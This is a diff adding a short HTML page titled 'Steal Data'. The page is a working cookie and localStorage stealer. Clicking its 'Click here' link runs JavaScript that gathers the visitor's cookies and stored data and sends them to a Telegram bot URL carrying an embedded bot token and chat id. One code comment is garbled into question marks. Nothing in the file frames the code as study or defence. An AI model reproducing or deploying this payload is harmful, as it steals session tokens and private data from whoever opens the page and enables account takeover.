@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Steal Data</title>
+</head>
+<body>
+
+<a href="javascript:void(0);" onclick="stealData()">Click here</a>
+
+<script>
+function stealData() {
+? // Retrieve cookies
+? var cookies = document.cookie;
+? 
+? // Retrieve local storage data
+? var localStorageData = JSON.stringify(localStorage);
+? 
+? // Send stolen data to Telegram
+? var xhr = new XMLHttpRequest();
+? xhr.open("GET", "https://api.telegram.org/bot7120302989:AAG4ztzubzgfscIJl6BnmsK2QiuVRhFpdFQ/sendMessage?chat_id=6842468827&text=Cookies: " + cookies + "%0A%0ALocal Storage Data: " + localStorageData, true);
+? xhr.withCredentials = true; // ???? ?? ????? ??? ????? ?????? ??????? ?? ?????
+? xhr.send();
+}
+</script>
+
+</body>
+</html>
